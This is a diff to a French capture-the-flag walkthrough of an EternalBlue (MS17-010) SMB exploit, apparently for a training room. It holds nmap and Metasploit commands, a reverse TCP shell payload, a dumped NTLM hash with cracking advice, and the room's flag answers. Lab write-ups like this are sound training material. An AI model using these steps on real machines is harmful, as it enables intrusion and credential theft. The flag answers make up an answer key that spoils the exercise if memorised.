@@ -7,8 +7,7 @@ SMB (Server Message Block) est un protocole serveur-client réglant l’accès �
 
 #### Eternal Blue :
 
-Scanner la machine cible pour d'éventuelles vulenératibilité
-
+Scanner la machine cible pour d'éventuelles vulenératibilité :
 ```
 $ nmap -sS -Pn -A -p- ADRESSE_IP
 ```
@@ -100,9 +99,8 @@ Vulnerabilité à exploiter : <br/>
 Réponse : ms17-010
 ```
 
-Vérifier le satut de la vulnérabilité sur la machine cible :<br/>
+Vérifier le statut de la vulnérabilité sur la machine cible :<br/>
 ⚠️ Le port TCP 445 est aujourd’hui réservé pour établir la connexion et le transfert via TCP/SMB.
-
 ```console
 $ nmap -sS -Pn -p 445 ADRESSE_IP --script smb-vuln-ms17-010.nse
 ```
@@ -175,8 +173,6 @@ msf6 > use exploit/windows/smb/ms17_010_eternalblue
 ```
 
 * Afficher les options et définisser la valeur pour l'option nécessaire. Quel est le nom de cette propriété ?
-
-Configurer l'attaque :
 ```
 msf6 > exploit(windows/smb/ms17_010_eternalblue) > show options
 ```
@@ -211,14 +207,18 @@ Exploit target:
    0   Windows 7 and Server 2008 R2 (x64) All Service Packs
 ```
 
+```console
+Réponse : RHOSTS
+```
+
 Pour mettre à jour une propriété :
 ```
 set _OPTION_ _VALUE_
 ```
 
-:mushroom: Hint : Le host local doit être adapté à l'interface créée par le VPN
+:mushroom: Hint : Le host local doit être adapté à l'interface créée par le VPN.
 
-Préparer le payload pour enclencher un reverse shell en tcp :
+Préparer le payload pour enclencher un reverse shell en tcp adapté à l'architecture de la machine cible :
 ```
 set payload windows/x64/shell/reverse_tcp
 ```
@@ -380,6 +380,18 @@ Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 Récupérer le hash de Jon et essayer de le reverser avec crakstation.com ou l'utilitaire John the Ripper sur Kali.
 
 Récherche des fichiers flag plantés dans la machine cible, il y en a 3 :
+
+* Can you C it?
+```console
+Réponse : flag{access_the_machine}
 ```
-search -f flag*.txt
+
+Hint : Commencer par le flag 3.
+```console
+Réponse : flag{sam_database_elevated_access}
+```
+
+Ce flag peut être trouvé dans un excellent emplacement pour piller. Généralement, les administrateurs y ont sauvegardé des choses assez intéressantes.
+```console
+Réponse : flag{admin_documents_can_be_valuable}
 ```
